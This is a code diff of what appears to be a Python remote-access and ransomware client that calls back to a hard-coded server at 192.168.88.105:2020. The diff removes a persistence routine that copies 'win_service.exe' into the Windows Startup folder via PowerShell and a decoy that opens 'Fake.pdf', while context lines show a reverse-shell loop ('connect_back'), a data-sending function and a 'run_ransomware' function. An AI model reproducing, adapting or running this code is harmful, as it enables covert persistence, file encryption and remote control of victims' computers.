@@ -2,10 +2,9 @@ import subprocess
 import os
 import socket
 import shlex
-import threading
 import sys
 import webbrowser
-SERVER_URL = "http://192.168.88.106:2020"
+SERVER_URL = "http://192.168.88.105:2020"
 import shlex
 import pyautogui
 import random
@@ -43,30 +42,6 @@ banner = r"""
       - Clear console.
 =====================================================
 """
-def set_malware_forever():
-    file_name="win_service.exe"
-    if hasattr(sys, "_MEIPASS"):
-        base_path = sys._MEIPASS
-    else:
-        base_path = os.path.dirname(os.path.abspath(__file__))
-    source = os.path.join(base_path, file_name)
-    startup_path = os.path.join(
-        os.environ["APPDATA"],
-        r"Microsoft\Windows\Start Menu\Programs\Startup"
-    )
-    destination = os.path.join(startup_path, file_name)
-    try:
-        if os.path.exists(destination):
-            subprocess.run(
-                ["powershell", "-Command", f'Remove-Item "{destination}" -Force'],
-                check=True
-            )
-        subprocess.run(
-            ["powershell", "-Command", f'Copy-Item "{source}" "{destination}"'],
-            check=True
-        )
-    except subprocess.CalledProcessError:
-        pass
 def set_wallpaper(file):
     SPI_SETDESKWALLPAPER = 20
     if hasattr(sys, "_MEIPASS"):
@@ -241,13 +216,6 @@ def send_all():
         return success
     except Exception as e:
         return False
-def open_pdf():
-    if hasattr(sys, "_MEIPASS"):
-        base_path = sys._MEIPASS
-    else:
-        base_path = os.path.dirname(__file__)
-    pdf_path = os.path.join(base_path, "Fake.pdf")
-    webbrowser.open(pdf_path)
 def run_ransomware():
     if hasattr(sys, "_MEIPASS"):
         base_path = sys._MEIPASS
@@ -357,8 +325,6 @@ def connect_back():
         except Exception as e:
             s.send(f"[-] Error: {e}\n".encode())
     s.close()
-threading.Thread(target=open_pdf).start()
-threading.Thread(target=set_malware_forever).start()
 while True:
     try:
         connect_back()
